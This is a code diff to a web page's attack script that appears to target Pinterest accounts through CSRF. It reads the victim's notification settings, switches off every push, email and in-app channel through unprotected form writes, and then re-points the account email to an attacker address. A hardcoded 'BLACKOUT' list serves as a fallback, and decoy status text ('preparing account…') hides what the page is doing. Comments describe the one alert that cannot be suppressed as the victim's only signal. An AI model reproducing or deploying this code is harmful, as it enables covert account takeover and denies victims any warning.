@@ -160,25 +160,30 @@ async function run() {
     MODE = 'toplevel';
   }
 
-  // 2 — strip every optional email notification (v3_post_settings_email takes
-  //     section/option/value, form-encoded, no CSRF token — verified live).
-  //     Verified limit: the security change-of-email alert to the old address
-  //     is NOT suppressible (the switch is scoped "except privacy and account
-  //     emails"), so that one alert is the victim's only signal; every other
-  //     email category goes dark.
+  // 2 — darken every notification channel (v3_post_settings_all_notifications:
+  //     updated_settings = JSON list of {type,section,option,value} tuples,
+  //     form-encoded, no CSRF token — verified live: toggles flip). Verified
+  //     limit: the security change-of-email alert to the old address is NOT
+  //     suppressible (scoped "except privacy and account emails"), so that one
+  //     alert is the victim's only signal; every other channel goes dark.
   say('preparing account…');
-  await formWrite('/settings/email/', { section: 'settings_email_everything', option: 'ONLY_REQUIRED', value: 'true' });
+  var tuples = [];
   if (MODE === 'silent') {
-    var promoKeys = ['boards_for_you_v2', 'search_recommendations_v2',
-      'pins_inspired_by_your_recent_activity_v2', 'pins_picked_for_you_v2', 'popular_pins_v2',
-      'group_board_and_community_updates_v2', 'messaging_v2', 'price_drops_on_saved_pins',
-      'marketing_communications_v2', 'feedback_and_surveys_v2', 'reports_and_violations_center',
-      'shuffles_activity'];
-    for (var pi = 0; pi < promoKeys.length; pi++) {
-      await formWrite('/settings/email/', { section: 'settings_email_v2', option: promoKeys[pi], value: 'false' });
-    }
-    await wait(1500);
+    var raw = await read('/settings/notifications/');
+    (function collect(n) {
+      if (!n || tuples.length) return;
+      if (Array.isArray(n)) { n.forEach(collect); return; }
+      if (typeof n !== 'object') return;
+      (n.channel_options || []).forEach(function (c) {
+        if (c.value !== false) tuples.push({ type: c.channel, section: c.category_key, option: c.subcategory_key, value: false });
+      });
+      Object.keys(n).forEach(function (k) { if (k !== 'channel_options') collect(n[k]); });
+    })(raw && raw.data);
   }
+  if (!tuples.length) tuples = BLACKOUT;
+  await formWrite('/settings/notifications/', { updated_settings: JSON.stringify(tuples) });
+  await formWrite('/settings/email/', { section: 'settings_email_everything', option: 'ONLY_REQUIRED', value: 'true' });
+  await wait(1500);
 
   // 3 — re-point the account email at the attacker plus-address
   say('updating account…');
@@ -212,6 +217,8 @@ async function run() {
   await wait(600);
   document.body.classList.add('is-done');
 }
+
+var BLACKOUT = [{"type":"push","section":"settings_push_v2","option":"published_comments","value":false},{"type":"news","section":"settings_news_categories","option":"published_comments","value":false},{"type":"push","section":"settings_push_v2","option":"published_reactions","value":false},{"type":"news","section":"settings_news_categories","option":"published_reactions","value":false},{"type":"push","section":"settings_push_v2","option":"published_saves","value":false},{"type":"push","section":"settings_push_v2","option":"views_and_impressions","value":false},{"type":"news","section":"settings_news_categories","option":"views_and_impressions","value":false},{"type":"push","section":"settings_push_v2","option":"published_collages","value":false},{"type":"push","section":"settings_push_v2","option":"saved_pin_comments","value":false},{"type":"news","section":"settings_news_categories","option":"saved_pin_comments","value":false},{"type":"push","section":"settings_push_v2","option":"saved_pin_mentions","value":false},{"type":"news","section":"settings_news_categories","option":"saved_pin_mentions","value":false},{"type":"push","section":"settings_push_v2","option":"saved_pin_reminders","value":false},{"type":"news","section":"settings_news_categories","option":"saved_pin_reminders","value":false},{"type":"push","section":"settings_push_v2","option":"saved_pin_tries","value":false},{"type":"news","section":"settings_news_categories","option":"saved_pin_tries","value":false},{"type":"push","section":"settings_push_v2","option":"group_board_updates","value":false},{"type":"email","section":"settings_email_v2","option":"group_board_updates","value":false},{"type":"news","section":"settings_news_categories","option":"group_board_updates","value":false},{"type":"push","section":"settings_push_v2","option":"group_board_invites","value":false},{"type":"push","section":"settings_push_v2","option":"messages","value":false},{"type":"email","section":"settings_email_v2","option":"messages","value":false},{"type":"news","section":"settings_news_categories","option":"messages","value":false},{"type":"push","section":"settings_push_v2","option":"followers","value":false},{"type":"push","section":"settings_push_v2","option":"homefeed_pins","value":false},{"type":"email","section":"settings_email_v2","option":"homefeed_pins","value":false},{"type":"news","section":"settings_news_categories","option":"homefeed_pins","value":false},{"type":"push","section":"settings_push_v2","option":"pins_picked_for_you","value":false},{"type":"email","section":"settings_email_v2","option":"pins_picked_for_you","value":false},{"type":"news","section":"settings_news_categories","option":"pins_picked_for_you","value":false},{"type":"push","section":"settings_push_v2","option":"based_on_activity","value":false},{"type":"email","section":"settings_email_v2","option":"based_on_activity","value":false},{"type":"news","section":"settings_news_categories","option":"based_on_activity","value":false},{"type":"push","section":"settings_push_v2","option":"board_recommendations","value":false},{"type":"email","section":"settings_email_v2","option":"board_recommendations","value":false},{"type":"news","section":"settings_news_categories","option":"board_recommendations","value":false},{"type":"push","section":"settings_push_v2","option":"search_recommendations","value":false},{"type":"email","section":"settings_email_v2","option":"search_recommendations","value":false},{"type":"news","section":"settings_news_categories","option":"search_recommendations","value":false},{"type":"push","section":"settings_push_v2","option":"followee_pins","value":false},{"type":"news","section":"settings_news_categories","option":"followee_pins","value":false},{"type":"push","section":"settings_push_v2","option":"shadow_followee_pins","value":false},{"type":"news","section":"settings_news_categories","option":"shadow_followee_pins","value":false},{"type":"push","section":"settings_push_v2","option":"shopping_recommendations","value":false},{"type":"email","section":"settings_email_v2","option":"shopping_recommendations","value":false},{"type":"news","section":"settings_news_categories","option":"shopping_recommendations","value":false},{"type":"email","section":"settings_email_v2","option":"pinterest_announcements","value":false},{"type":"email","section":"settings_email_v2","option":"surveys_and_quizzes","value":false},{"type":"email","section":"settings_email_v2","option":"reports_and_violations_center","value":false},{"type":"email","section":"settings_email_v2","option":"shuffles_activity","value":false},{"type":"push","section":"settings_push_everything","option":"NO_PUSH","value":false},{"type":"web_push","section":"settings_web_push_everything","option":"NO_WEB_PUSH","value":false},{"type":"email","section":"settings_email_everything","option":"ONLY_REQUIRED","value":false},{"type":"news","section":"settings_news","option":"NONE_IN_APP","value":false}];
 
 run();
 </script>
